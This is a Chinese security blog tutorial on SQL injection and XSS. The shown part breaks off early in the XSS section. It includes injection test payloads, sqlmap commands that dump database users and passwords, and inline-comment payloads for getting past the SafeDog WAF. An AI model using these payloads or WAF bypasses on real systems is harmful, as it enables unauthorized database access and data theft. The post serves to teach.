

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#FFD8F2">
  <meta name="author" content="Sweety">
  <meta name="keywords" content="">
  
    <meta name="description" content="基础漏洞①SQL注入 SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。  1、先验知识 Mysql的三种注释风格：   单行注释：#后面直接添加注释内容 ​			  --后面直接添加注释内容">
<meta property="og:type" content="article">
<meta property="og:title" content="基础漏洞（一）之SQL注入、XSS、SSRF、CSRF">
<meta property="og:url" content="https://haoisbinlove.github.io/2024/08/02/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%B8%80%EF%BC%89%E4%B9%8BSQL%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81SSRF%E3%80%81CSRF/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="基础漏洞①SQL注入 SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。  1、先验知识 Mysql的三种注释风格：   单行注释：#后面直接添加注释内容 ​			  --后面直接添加注释内容">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png">
<meta property="article:published_time" content="2024-08-02T15:18:14.000Z">
<meta property="article:modified_time" content="2024-08-02T15:24:07.624Z">
<meta property="article:author" content="Sweety">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png">
  
  
    <meta name="referrer" content="no-referrer-when-downgrade">
  
  
  <title>基础漏洞（一）之SQL注入、XSS、SSRF、CSRF - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"haoisbinlove.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.2.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Sweety Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/24.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.08)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="基础漏洞（一）之SQL注入、XSS、SSRF、CSRF"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2024-08-02 23:18" pubdate>
          2024年8月2日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.3k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          62 分钟
        
      </span>
    

    
    
      
        <span id="busuanzi_container_page_pv" style="display: none">
          <i class="iconfont icon-eye" aria-hidden="true"></i>
          <span id="busuanzi_value_page_pv"></span> 次
        </span>
        
      
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">基础漏洞（一）之SQL注入、XSS、SSRF、CSRF</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h1><h2 id="①SQL注入"><a href="#①SQL注入" class="headerlink" title="①SQL注入"></a>①SQL注入</h2><blockquote>
<p>SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。</p>
</blockquote>
<h3 id="1、先验知识"><a href="#1、先验知识" class="headerlink" title="1、先验知识"></a>1、先验知识</h3><ul>
<li><h5 id="Mysql的三种注释风格："><a href="#Mysql的三种注释风格：" class="headerlink" title="Mysql的三种注释风格："></a>Mysql的三种注释风格：</h5></li>
</ul>
<blockquote>
<p>单行注释：<code>#</code>后面直接添加注释内容</p>
<p>​			  <code>--</code>后面直接添加注释内容</p>
<p>多行注释：<code>/*中间可跨行*/</code>于中间添加注释内容</p>
<p>内联注释：MySql为了保持于其它数据库兼容，避免从mysql中导出的sql语句不能被其它数据库使用。它将mysql中特有的语句放在了<code>/*！content*/</code>中，这些语句在不兼容的数据库中使用时便不会被执行，而mysql自身却能识别。</p>
<p>在SQL注入中，内联注释常用来绕过waf。</p>
</blockquote>
<ul>
<li><h5 id="Union联合查询："><a href="#Union联合查询：" class="headerlink" title="Union联合查询："></a>Union联合查询：</h5></li>
</ul>
<blockquote>
<p>Union操作符用于拼接两个或者多select查询语句</p>
<p>Union中的每个查询必须拥有相同的列数</p>
</blockquote>
<ul>
<li><h5 id="Order-by语句："><a href="#Order-by语句：" class="headerlink" title="Order by语句："></a>Order by语句：</h5></li>
</ul>
<blockquote>
<p>Order by语句用于根据指定的列对结果集进行排序</p>
<p>默认按照升序对记录进行排序</p>
</blockquote>
<ul>
<li><h5 id="SQL注入中常用的Mysql语句："><a href="#SQL注入中常用的Mysql语句：" class="headerlink" title="SQL注入中常用的Mysql语句："></a>SQL注入中常用的Mysql语句：</h5></li>
</ul>
<blockquote>
<p>user()	当前用户名</p>
<p>database()	当前所有数据库</p>
<p>current_user()	当前用户名（可用来查看权限）</p>
<p>version()	数据库版本</p>
<p>@@datadir	数据库路径</p>
<p>load_file()	读文件操作</p>
<p>into outfile() &#x2F; into dumpfile()	写文件操作</p>
</blockquote>
<ul>
<li><h5 id="sql注入读写文件的条件"><a href="#sql注入读写文件的条件" class="headerlink" title="sql注入读写文件的条件"></a>sql注入读写文件的条件</h5></li>
</ul>
<blockquote>
<p>数据库允许导入导出（secure_file_priv）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br></code></pre></td></tr></table></figure>

<p>当前用户文件操作权限（File_priv）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> File_priv from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure>
</blockquote>
<ul>
<li><h5 id="SQL注入漏洞的判断依据"><a href="#SQL注入漏洞的判断依据" class="headerlink" title="SQL注入漏洞的判断依据"></a>SQL注入漏洞的判断依据</h5></li>
</ul>
<blockquote>
<p>构建测试语句</p>
<p>提交请求</p>
<p>分析返回结果</p>
<p>①符合预期结果，则存在SQL注入漏洞</p>
<p>②不符合预期结果，则可以判断为不存在SQL注入漏洞，当然也可以再次构造测试语句进行进一步的测试。</p>
</blockquote>
<ul>
<li><h5 id="SQL注入漏洞的类型"><a href="#SQL注入漏洞的类型" class="headerlink" title="SQL注入漏洞的类型"></a>SQL注入漏洞的类型</h5></li>
</ul>
<blockquote>
<p>通常分为两种：数字型、字符型</p>
</blockquote>
<h3 id="2、SQL注入技术"><a href="#2、SQL注入技术" class="headerlink" title="2、SQL注入技术"></a>2、SQL注入技术</h3><blockquote>
<p>主要分为三种注入技术：</p>
<ul>
<li>基于报错注入（Error-based）</li>
<li>基于Union联合查询注入</li>
<li>基于盲注（Bind SQL injection）</li>
</ul>
</blockquote>
<ul>
<li><h5 id="基于报错注入（Error-based）"><a href="#基于报错注入（Error-based）" class="headerlink" title="基于报错注入（Error-based）"></a>基于报错注入（Error-based）</h5></li>
</ul>
<p><code>用法</code>：构造错误的SQL命令将注入信息在数据库错误信息中显示出来。</p>
<p><code>条件</code>：需要根据不同数据库的错误处理机制以及脚本语言错误处理机制构造。</p>
<p><code>注意</code>：有字节数限制，可将注入的字符串信息拆分显示。</p>
<p><code>特点</code>：效率高。</p>
<ul>
<li><h5 id="基于Union联合查询注入"><a href="#基于Union联合查询注入" class="headerlink" title="基于Union联合查询注入"></a>基于Union联合查询注入</h5></li>
</ul>
<p><code>用途</code>：用于合并两个或多个select语句的结果集。</p>
<p><code>用法</code>：<code>union select column_name(s) from table_name1</code></p>
<p><code>注意</code>：union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。默认union操作符选取不同的值。(如果允许重复的值，则使用<code>union all</code>)</p>
<p><code>特点</code>：效率高，可一次批量查询大量数据。</p>
<ul>
<li><h5 id="基于盲注（Bind-SQL-injection）"><a href="#基于盲注（Bind-SQL-injection）" class="headerlink" title="基于盲注（Bind SQL injection）"></a>基于盲注（Bind SQL injection）</h5></li>
</ul>
<p><code>用途</code>：在无法通过显示位和错误信息获取目标数据时，根据注入语句返回的true、false的结果页面不同暴力猜解目标数据。</p>
<p><code>用法</code>：<code>使用条件语句，如 if 、 case when等</code></p>
<p><code>特点</code>：暴力猜解，速度慢，效率低。</p>
<h3 id="3、SQL注入实操"><a href="#3、SQL注入实操" class="headerlink" title="3、SQL注入实操"></a>3、SQL注入实操</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dhan/p/18290502">SQL注入基础入门-详细</a></p>
<h5 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h5><blockquote>
<p>有个注意的点：url后面必须是可注入的参数?id&#x3D;之类的，否则url检测会有问题。</p>
</blockquote>
<ul>
<li><strong>单引号判断法：</strong></li>
</ul>
<p>在参数（通常为网页URL）后面加上单引号（英文），重新加载网页。</p>
<blockquote>
<p>如果页面返回错误，则表示存在SQL注入。（无论是字符型还是整型都会因为单引号个数不匹配而报错）</p>
<p>如果未报错，也无法断定不存在SQL注入。（可能页面对单引号设置了过滤，此时可以使用判断语句进行注入）</p>
</blockquote>
<h5 id="SQL注入类型判断"><a href="#SQL注入类型判断" class="headerlink" title="(SQL注入类型判断)"></a>(SQL注入类型判断)</h5><ul>
<li><strong>数字型判断</strong></li>
</ul>
<blockquote>
<p>‘select * from <tablename> where id &#x3D; x’</p>
<p>当输入的参数 x 为整型时，通常在abc.php中的这种类型可以使用经典的<code>and 1=1</code>和<code>and 1=2</code>来进行判断：</p>
<p>url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>，若网页页面依旧运行正常，则继续执行下一步👇</p>
<p>url地址中输入<code>http://xxx/abc.php?id=x and 1=2</code>，页面运行错误，则说明此SQL注入为数字型注入。（换言之，如果仍然正常说明不是数字型SQL注入）</p>
</blockquote>
<ul>
<li><strong>字符型注入</strong></li>
</ul>
<blockquote>
<p>‘select * from <tablename> where id &#x3D; x’</p>
<p>当输入的参数 x 为字符型时，同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p>
<p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;1</code>时，如果网页页面运行正常，则继续执行下一步👇</p>
<p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;2</code>时，页面运行错误，则说明此SQL注入为字符型注入。</p>
</blockquote>
<ul>
<li><strong>sqlmap注入判断</strong></li>
</ul>
<p>当前面三种注入判断方法都尝试过，并且显示的界面都是正常的时候。此时我们仍无法断定其不存在SQL注入，可以再使用sqlmap进行扫描测试，如果再扫不出注入口的话，那有九成把握断定其不存在SQL注入。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yy-123/p/16749289.html">SQLMap入门——判断是否存在注入</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582981.html">sqlmap使用手册（更直白款）</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有表名</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取当前库名</span><br>sqlmap -u url --current-db<br><br><span class="hljs-comment"># 获取当前连接数据库的用户名    </span><br>sqlmap -u url --current-user<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D security --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure>

<h3 id="4、绕过安全狗（防SQL注入功能）"><a href="#4、绕过安全狗（防SQL注入功能）" class="headerlink" title="4、绕过安全狗（防SQL注入功能）"></a>4、绕过安全狗（防SQL注入功能）</h3><p>什么是安全狗？</p>
<blockquote>
<p>安全狗是一种网络安全服务，主要用于网站的防护和安全监测。具体来说，网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马&#x2F;木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a></p>
<p>由于安全狗是一款常用于网站安全保护的服务器工具，其包含了防SQL注入的功能。绕过安全狗的防SQL注入功能，顾名思义，便能够执行SQL注入了。</p>
<p>那么如果绕过安全狗中的防SQL注入模块呢？</p>
<blockquote>
<p>一般来说，安全狗不会对POST请求做检测，如果POST请求也被拦截的话，那就可以尝试进行分块传输。</p>
</blockquote>
<h4 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h4><p>内联注释符：<code>/*!...*/</code></p>
<p>绕过思路：</p>
<p>· 首先使用常规判断注入的方法（and 1&#x3D;1 或其它）判断类型。</p>
<p>· 如果被拦截，使用非·常规判断方法（and -1&#x3D;-1–+ 后面的<code>--+</code>是注释符）判断类型。</p>
<p>· 如果还是被拦截，那基本可以判断为<code>安全狗一般都会拦截 and+一些组合语句 </code>，</p>
<p>· 接下来可以使用<code>四则运算</code>判断，<code>/1返回正常页面，/0返回异常页面，则表示其为数字型注入</code>，如果是数字型注入的话，尝试使用<code>order by</code>绕过：</p>
<blockquote>
<p>输入：%20&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F;%20&#x2F;<em><strong><strong>!23144by</strong></strong></em>&#x2F;%201–+</p>
<p>%20表示空格</p>
<p>实际显示： &#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F; &#x2F;*****!23144by*&#x2F; 1–+</p>
</blockquote>
<blockquote>
<p>字符型绕过：</p>
<p><code>1&#39;/case when 1=1 then &#39;1&#39; else &#39;0&#39; end--+ </code></p>
<p><code>1&#39;/case when 1=1 then 1 else 0 end--+</code></p>
</blockquote>
<p>· 如果被拦截了，尝试使用<code>if</code>语句：</p>
<blockquote>
<p>if(1&#x3D;1,1,0)</p>
<p>if(1&#x3D;0,1,0)</p>
</blockquote>
<p>如果条件为真页面返回正常，注入成功，为假页面返回异常的话。那就表明if语句绕过成功了。</p>
<p>· 先判断数据库长度：<code>if(length(database())&gt;0,1,0)</code></p>
<p>· 若被拦截，使用字符替换其中的<code>database()</code>验证是否是该函数被拦截。<code>if(length(&#39;abc&#39;)&gt;0,1,0)</code></p>
<p>· 若返回页面正常，则表示是其中的<code>database()</code>被拦截</p>
<p>· 使用<code>内联绕过</code>：<code>if(length(/*!06440database*/())%3E0,1,0)</code>其中，<code>%3E</code>表示<code>&gt; </code>符号，将函数名使用内联注释符框住，执行。</p>
<p>· 正常来说，如此便会成功绕过。（不会被拦截啦）</p>
<p>· 之后就是执行参数污染等操作了：</p>
<blockquote>
<p><code>/**&amp;id=-1 union select 1,2,3#*/ </code></p>
<p><code>/**-1 union select 1,2,3#*/ </code></p>
<p><code>/***/</code></p>
</blockquote>
<h3 id="5、DNS外带SQL注入（属于mysql盲注）"><a href="#5、DNS外带SQL注入（属于mysql盲注）" class="headerlink" title="5、DNS外带SQL注入（属于mysql盲注）"></a>5、DNS外带SQL注入（属于mysql盲注）</h3><p>使用场景：无法通过联合查询直接获取数据的情况下，注入时无回显时，可尝试使用 DNSlog 外带注入。</p>
<p>用途：用于在SQL注入攻击中绕过防火墙和安全措施，以获取更多的信息。</p>
<p>利用条件：①DNSlog外带要用到 Load_file()函数，需要当前数据库用户有读权限。②设置 <code>secure_file_priv</code>为空。查询权限的语句为：<code>select file_priv from mysql.user where user=&#39;&#39;</code></p>
<blockquote>
<p>DNSlog注入的原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为<code>summer.com</code>，要使用的payload为<code>whoami.summer.com</code>，就可以通过DNS解析日志来获取到主机名。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/323674.html">mysql盲注之dns外带注入</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操</a></p>
<h3 id="6、sqlmap使用"><a href="#6、sqlmap使用" class="headerlink" title="6、sqlmap使用"></a>6、sqlmap使用</h3><p>先验知识：</p>
<blockquote>
<p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">SQLmap使用教程图文教程</a></p>
<p>常用表：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a, --all           检索所有内容<br>   -b, --banner        检索DBMS横幅<br>   --current-user      检索DBMS当前用户<br>   --current-db        检索DBMS当前数据库<br>   --hostname          检索DBMS服务器主机名<br>   --is-dba            检测DBMS当前用户是否为DBA<br>   --<span class="hljs-built_in">users</span>             枚举DBMS用户<br>   --passwords         枚举DBMS用户密码哈希值<br>   --privileges        枚举DBMS用户权限<br>   --roles             枚举DBMS用户角色<br>   --dbs               枚举DBMS数据库<br>   --tables            枚举DBMS数据库表<br>   --columns           枚举DBMS数据库表列<br>   --schema            枚举DBMS模式<br>   --count             检索表的条目数<br>   --dump              转储DBMS数据库表条目<br>   --dump-all          转储所有DBMS数据库表条目<br>   --search            搜索列、表和/或数据库名称<br>   --comments          在枚举过程中检查DBMS注释<br>   --statements        检索在DBMS上运行的SQL语句<br>   -D DB               要枚举的DBMS数据库<br>   -T TBL              要枚举的DBMS数据库表<br>   -C COL              要枚举的DBMS数据库表列<br>   -X EXCLUDE          不要枚举的DBMS数据库标识符<br>   -U USER             要枚举的DBMS用户<br>   --exclude-sysdbs    在枚举表时排除DBMS系统数据库<br>   --pivot-column=P..  枢轴列名称<br>   --<span class="hljs-built_in">where</span>=DUMPWHERE   在转储表时使用WHERE条件<br>   --start=LIMITSTART  要检索的第一个转储表条目<br>   --stop=LIMITSTOP    要检索的最后一个转储表条目<br>   --first=FIRSTCHAR   要检索的第一个查询输出单词字符<br>   --last=LASTCHAR     要检索的最后一个查询输出单词字符<br>   --sql-query=SQLQ..  要执行的SQL语句<br>   --sql-shell         提示进行交互式SQL shell<br>   --sql-file=SQLFILE  从给定文件中执行SQL语句<br><br></code></pre></td></tr></table></figure>



<h2 id="②XSS跨站脚本攻击"><a href="#②XSS跨站脚本攻击" class="headerlink" title="②XSS跨站脚本攻击"></a>②XSS跨站脚本攻击</h2><h3 id="1、漏洞简介"><a href="#1、漏洞简介" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><ul>
<li><p>XSS，跨站脚本攻击，是指恶意攻击者网<code>web页面</code>中<code>插入恶意代码</code>，当用户<code>浏览该网页时</code>，嵌入其中的恶意代码就会被执行，从而达到攻击者的目的。</p>
</li>
<li><p>XSS属于被动攻击。最大的特点是，能注入恶意的html&#x2F;JavaScript代码到用户浏览的网页上，从而达到的挟持用户会话的目的。</p>
</li>
<li><p>危害：窃取用户&#x2F;管理员的cookie非法登陆；网站挂马（将恶意木马代码插入到web页面中，用户访问页面目标计算机就会被植入木马）；发送广告或垃圾信息。</p>
</li>
</ul>
<h3 id="2、漏洞类型"><a href="#2、漏洞类型" class="headerlink" title="2、漏洞类型"></a>2、漏洞类型</h3><p><strong>主要分为三种类型：</strong></p>
<h4 id="反射类XSS（非持久型XSS）"><a href="#反射类XSS（非持久型XSS）" class="headerlink" title="反射类XSS（非持久型XSS）"></a>反射类XSS（非持久型XSS）</h4><p>攻击者需要通过<code>诱使用户点击</code>包含XSS攻击代码的恶意链接，接着用户方的浏览器就会执行恶意代码触发XSS漏洞。</p>
<p>· 利用：常见的利用方法是在URL中构造，将恶意链接发送给目标用户。（当用户访问该链接时，其浏览器会向服务器发起一个GET请求来提交带有恶意代码的链接，在浏览器中解析）</p>
<p>· 一般情况下，反射性XSS存在于搜索框，<code>通过URL控制页面的输出</code>。简而言之为，将参数传入服务器，再由服务器输出出来。</p>
<h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>攻击者需要事先将javascript<code>代码上传或存储</code>到存在漏洞的服务器中。当受害者浏览包含此恶意Javascript代码的页面时便会触发恶意代码。</p>
<p>· 利用：需要将恶意代码上传至服务器中。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45842420/article/details/123450070">本地代码上传到服务器</a></p>
<h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>它是一种特殊的反射型XSS。</p>
<p>· DOM树，文档对象模型，web前端开发中常使用到的模型。</p>
<p>· 主要由客户端的脚本程序通过DOM动态地输出数据到页面，而非依赖于将数据提交给服务器端。明白说来是，js脚本从url中获取数据并将其传递到<code>支持动态代码执行的接收器</code>时，就会产生DOM-XSS漏洞。咦？DOM-XSS一般产生于<code>用户能够进行参数输入查询的地方</code>（比如搜索框捏）。</p>
<p>· 常见的接收器：</p>
<blockquote>
<p>document.write()<br>document.writeln()<br>document.domain<br>someDOMElement.innerHTML<br>someDOMElement.outerHTML<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p>
</blockquote>
